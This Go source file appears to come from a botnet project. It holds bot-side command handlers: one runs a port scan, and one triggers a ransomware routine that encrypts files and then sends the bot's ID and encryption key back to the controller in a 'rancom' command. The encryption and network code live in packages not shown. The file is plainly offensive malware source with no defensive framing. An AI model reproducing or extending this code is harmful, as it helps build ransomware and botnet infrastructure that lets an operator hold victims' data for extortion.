package tcp

import (
	"fmt"
	"log"

	"github.com/rodzzlessa24/botnet"
)

//HandleScan is
func (b *BotService) HandleScan(payload []byte) {
	resCh := b.PortScanner.SimpleScan([]string{"127.0.0.1"})
	var res []string
	for addr := range resCh {
		fmt.Println("addr found", addr)
		res = append(res, addr)
	}
}

//HandleRansome is
func (b *BotService) HandleRansome(payload []byte) {
	if err := b.Ransomer.Encrypt(""); err != nil {
		log.Panic(err)
	}
	msg := &ransomCompleteRequest{
		BotID: b.Bot.ID,
		Key:   b.Ransomer.Key(),
	}
	by, err := botnet.Bytes(msg)
	if err != nil {
		log.Panic(err)
	}
	data := append(commandToBytes("rancom"), by...)
	b.RansomCompleteCmd(data)
}
